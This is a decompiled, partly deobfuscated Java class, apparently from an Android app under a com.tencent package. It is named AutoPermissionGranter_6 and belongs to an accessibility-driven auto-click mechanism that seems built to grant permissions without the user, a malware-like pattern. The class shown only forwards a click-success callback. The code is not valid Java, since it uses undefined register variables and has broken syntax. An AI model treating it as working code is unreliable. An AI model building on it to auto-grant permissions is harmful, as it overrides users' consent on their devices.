package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AutoPermissionGranter_6
 * Original: Lcom/tencent/Perf_tunesxconcerningn10_ect$6;
 */
class AutoPermissionGranter_6 implements AutoClickInterface; {

    // === FIELDS ===
    final AutoClickInterface val$clictunesxconcerningn10kByRecycleCallBack;

    // === METHODS ===

     void Constructor(AutoClickInterface param0) {
        v0.val$clictunesxconcerningn10kByRecycleCallBack = v1;
        // new Object()
        return;
    }

    public void clickSuccess(boolean param0) {
        v2 = v1.val$clictunesxconcerningn10kByRecycleCallBack;
        v0 = 1;
        v2.clickSuccess(1);
        return;
    }
}
